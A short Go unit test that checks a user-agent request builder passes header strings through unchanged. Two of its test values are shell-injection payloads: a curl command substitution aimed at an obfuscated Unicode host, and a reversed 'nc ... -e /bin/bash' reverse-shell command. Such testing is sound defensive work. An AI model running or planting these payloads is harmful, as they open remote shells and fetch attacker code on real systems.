package placeholder

import "testing"

func TestUserAgent(t *testing.T) {
	const testUrl = "https://example.com"

	tests := []string{
		"",
		"ua1",
		"ua2",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0",
		"`curl -L http://\u24BC\u24C4\u24C4\u24BC\u24C1\u24BA.\u24B8\u24C4\u24C2`",
		"$(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)",
	}

	for _, testUA := range tests {
		req, err := DefaultUserAgent.CreateRequest(testUrl, testUA, nil)
		if err != nil {
			t.Fatalf("got an error while testing: %v", err)
		}

		if reqUA := req.UserAgent(); reqUA != testUA {
			t.Fatalf("got %s, want %s", reqUA, testUA)
		}
	}
}
